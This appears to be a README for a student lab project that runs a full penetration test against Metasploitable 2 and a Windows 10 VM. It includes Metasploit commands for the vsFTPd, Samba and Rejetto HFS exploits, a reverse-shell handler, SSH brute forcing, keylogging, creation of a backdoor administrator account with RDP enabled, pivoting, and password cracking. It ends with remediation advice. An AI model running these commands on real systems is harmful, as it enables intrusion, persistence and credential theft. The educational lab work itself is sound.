# 🔴 Red Team Lab Setup \& Metasploitable Full Assessment

> \*\*Author:\*\* Md. Redowanul Haq Rafi (CADS001)  
> \*\*Date:\*\* May 15–17, 2026  
> \*\*Classification:\*\* Educational — Controlled Lab Environment Only  
> \*\*Tools:\*\* Kali Linux · VMware · Nmap · Metasploit · msfvenom · John the Ripper · Wireshark · Burp Suite · Proxychains

\---

## ⚠️ Disclaimer

This project was conducted **entirely in an isolated virtual lab environment** for academic and educational purposes only. All targets (Metasploitable 2 and a Windows 10 VM) are intentionally vulnerable machines created for learning. **Never use these techniques on systems you do not own or have explicit written permission to test. Unauthorized penetration testing is illegal.**

\---

## 📋 Project Overview

This project demonstrates a full Red Team penetration test cycle — from building the lab to achieving complete system compromise — using professional tools and techniques used in real-world security assessments.

**Three virtual machines** were configured in VMware:

|Machine|Role|IP Address|
|-|-|-|
|Kali Linux|Attacker|192.168.50.2 (VLan1) / 192.168.78.131 (NAT)|
|Metasploitable 2|Primary Target|192.168.50.3 (eth0) / 10.10.10.5 (eth1)|
|Windows 10|Secondary Target|10.10.10.x (VLan2)|

\---

## 🏗️ Lab Architecture

```
\[ KALI LINUX ATTACKER ]
   192.168.50.2 (VLan1)
   192.168.78.131 (NAT - for payload delivery)
         |
         | VLan1 (192.168.50.0/24)
         |
\[ METASPLOITABLE 2 ]  ←── Primary Target
   eth0: 192.168.50.3  (reachable from Kali)
   eth1: 10.10.10.5    (internal pivot network)
         |
         | VLan2 (10.10.10.0/24)  ←── Pivot Network
         |
\[ WINDOWS 10 ]  ←── Secondary Target (only reachable via pivot)
   10.10.10.x
```

> \*\*Pivoting Note:\*\* Kali cannot directly reach Windows (10.10.10.x). Traffic is routed \*\*through Metasploitable\*\* using Proxychains + Meterpreter routing.
>
> \*\*Payload Delivery Note:\*\* When delivering payloads to Windows, Kali's network adapter was switched to \*\*NAT (VMnet8)\*\* to get internet/host connectivity. LHOST was set to `192.168.78.131`.

\---

## 🎯 Project Objectives

* \[x] Set up a personal Red Team Lab environment in VMware
* \[x] Configure Kali Linux and Metasploitable 2
* \[x] Configure a Windows 10 machine as a secondary pivot target
* \[x] Perform full target enumeration (Nmap + Metasploit)
* \[x] Identify vulnerabilities across all services
* \[x] Exploit each vulnerable service
* \[x] Achieve root/SYSTEM access on both targets
* \[x] Perform post-exploitation (keylogging, backdoor, RDP)
* \[x] Demonstrate network pivoting to internal network
* \[x] Crack password hashes offline
* \[x] Capture network traffic (Wireshark + Burp Suite)
* \[x] Document findings with remediation recommendations

\---

## 🔍 Enumeration Summary

All scans used `nmap -p \[PORT] -A \[TARGET\_IP]`:

|Port|Service|Version|Key Finding|
|-|-|-|-|
|21|FTP|vsFTPd 2.3.4|Anonymous login + Known backdoor|
|22|SSH|OpenSSH|Weak credentials (brute forced)|
|23|Telnet|Linux telnetd|Plaintext protocol — creds sniffable|
|80|HTTP|Apache 2.2.8|Outdated, WebDAV enabled, vulnerable apps|
|445|SMB|Samba 3.0.20|RCE vulnerability, signing disabled|
|3306|MySQL|MySQL 5.0.51a|No root password, exposed on network|
|80 (Win)|HTTP|Rejetto HFS|CVE-2024-23692 RCE|

\---

## 💥 Exploitation Summary

### 1\. FTP — vsFTPd 2.3.4 Backdoor (CVE-2011-2523)

```
use exploit/unix/ftp/vsftpd\_234\_backdoor
set RHOSTS 192.168.50.3
set LHOST 192.168.50.2
exploit
```

**Result:** Root shell on Metasploitable ✅

\---

### 2\. SSH — Brute Force Attack

```
use auxiliary/scanner/ssh/ssh\_login
set RHOSTS 192.168.50.3
set USER\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_users.txt
set PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt
set STOP\_ON\_SUCCESS true
run
```

**Result:** Credentials cracked → SSH login as msfadmin ✅

\---

### 3\. SMB — Samba usermap\_script (CVE-2007-2447)

```
use exploit/multi/samba/usermap\_script
set RHOSTS 192.168.50.3
exploit
```

**Result:** Root shell via Samba command injection ✅

\---

### 4\. Telnet — Default Credentials

```bash
telnet 192.168.50.3
# Username: msfadmin
# Password: msfadmin
```

**Result:** Full shell access via Telnet ✅

\---

### 5\. MySQL — No Root Password

```bash
mysql -h 192.168.50.3 -u root
# No password required
```

**Result:** Full database access with root privileges ✅

\---

### 6\. Windows — Rejetto HFS RCE (CVE-2024-23692)

```
# Step 1: Switch Kali to NAT → get IP 192.168.78.131
# Step 2: Set up listener
use multi/handler
set payload windows/x64/meterpreter/reverse\_tcp
set LHOST 192.168.78.131
set LPORT 4488
run

# Step 3: Run exploit
use exploit/windows/http/rejetto\_hfs\_rce\_cve\_2024\_23692
set RHOSTS \[Windows IP]
exploit
```

**Result:** Meterpreter session on Windows SYSTEM ✅

\---

## 🔑 Post-Exploitation (Windows)

After getting Meterpreter on Windows:

```bash
# Keylogging
keyscan\_start
keyscan\_dump        # See all typed text
keyscan\_stop
screenshot          # Capture victim's screen

# Create Backdoor Admin Account
shell
net user Backdoor Pa$$w0rd123 /add
net localgroup administrators Backdoor /add
net localgroup "Remote Desktop Users" Backdoor /add

# Enable RDP
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

\---

## 🔄 Network Pivoting

To reach the Windows machine (10.10.10.x) which Kali cannot directly access:

```bash
# 1. Get Meterpreter session on Metasploitable (via FTP exploit)
# 2. In Metasploit: add route through session
route add 10.10.10.0/24 \[SESSION\_ID]

# 3. Use proxychains to scan through pivot
proxychains -q nmap -sT -Pn 10.10.10.5
```

**Result:** Full port scan of internal Windows machine via Metasploitable pivot ✅

\---

## 🔐 Password Cracking

```bash
# Crack NT hashes from Windows using John the Ripper
john --format=NT Hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Cracked:
# Admin : Pa$$w0rd123
```

\---

## 🌐 Network Sniffing

### Wireshark

* Captured plaintext Telnet credentials on eth0 (VLan1)
* Applied display filter: `telnet` or `ftp`
* Used "Follow TCP Stream" to see full credential exchange

### Burp Suite

* Configured browser proxy to 127.0.0.1:8080
* Intercepted HTTP requests to Metasploitable web apps
* Analyzed POST parameters for credentials and injection points

\---

## 🚨 Key Vulnerabilities Found

|#|Vulnerability|Severity|Status|
|-|-|-|-|
|1|vsFTPd 2.3.4 Backdoor (CVE-2011-2523)|🔴 CRITICAL|Exploited|
|2|Anonymous FTP Login|🟠 HIGH|Confirmed|
|3|SSH Weak Credentials|🟠 HIGH|Exploited|
|4|Telnet — Plaintext Protocol|🟠 HIGH|Exploited|
|5|Samba 3.0.20 RCE (CVE-2007-2447)|🔴 CRITICAL|Exploited|
|6|SMB Signing Disabled|🟡 MEDIUM|Confirmed|
|7|Apache 2.2.8 — Outdated|🟠 HIGH|Enumerated|
|8|MySQL — No Root Password|🔴 CRITICAL|Exploited|
|9|Rejetto HFS RCE (CVE-2024-23692)|🔴 CRITICAL|Exploited|
|10|Weak Windows Admin Password|🟠 HIGH|Cracked|
|11|Keylogging — No EDR|🔴 CRITICAL|Exploited|
|12|Backdoor Account + RDP|🔴 CRITICAL|Exploited|
|13|Network Pivoting via Dual-homed Host|🟠 HIGH|Exploited|
|14|Plaintext Traffic (Telnet/FTP)|🟠 HIGH|Confirmed|

\---

## 🛡️ Remediation Recommendations

|Service|Fix|
|-|-|
|FTP|Upgrade vsFTPd, disable anonymous login, switch to SFTP|
|SSH|Use key-based auth only, disable password auth, deploy fail2ban|
|Telnet|**Disable completely** — replace with SSH|
|SMB|Upgrade Samba, enable SMB signing, block 445 at firewall|
|HTTP|Upgrade Apache, disable WebDAV, deploy WAF, use HTTPS|
|MySQL|Set root password, block port 3306 from network, upgrade|
|Windows|Patch HFS, install EDR, enforce strong passwords, enable Defender|
|Network|Segment VLANs, deploy IDS/IPS, block pivoting routes|

\---

## 🛠️ Tools Used

|Tool|Purpose|
|-|-|
|VMware Workstation|Lab virtualization|
|Kali Linux|Attacker OS|
|Nmap|Port scanning \& service enumeration|
|Metasploit Framework|Exploitation framework|
|msfvenom|Payload generation|
|John the Ripper|Password hash cracking|
|Wireshark|Network packet capture|
|Burp Suite|HTTP traffic interception|
|Proxychains|Network pivoting tunnel|

\---

## 📁 Project Structure

```
Project/
├── Lab\_Environment\_Setup/   # VMware setup, network config screenshots
├── FTP/                     # vsFTPd enumeration \& exploitation
├── SSH/                     # SSH brute force \& login
├── Telnet/                  # Telnet exploitation
├── SMB/                     # Samba enumeration \& exploitation
├── HTTP/                    # Apache \& web app exploitation
├── MySql/                   # MySQL enumeration \& access
├── Password Cracking/       # John the Ripper hash cracking
├── Pivoting/                # Proxychains \& network pivoting
├── Windows\_Payload+Hfs/     # Windows payload, HFS exploit, post-exploitation
├── Sniffing/                # Wireshark packet capture
└── Sniffing with burp/      # Burp Suite HTTP interception
```

\---

*This project was completed as part of an Ethical Hacking \& Penetration Testing course. All activities were conducted in a controlled, isolated lab environment.*

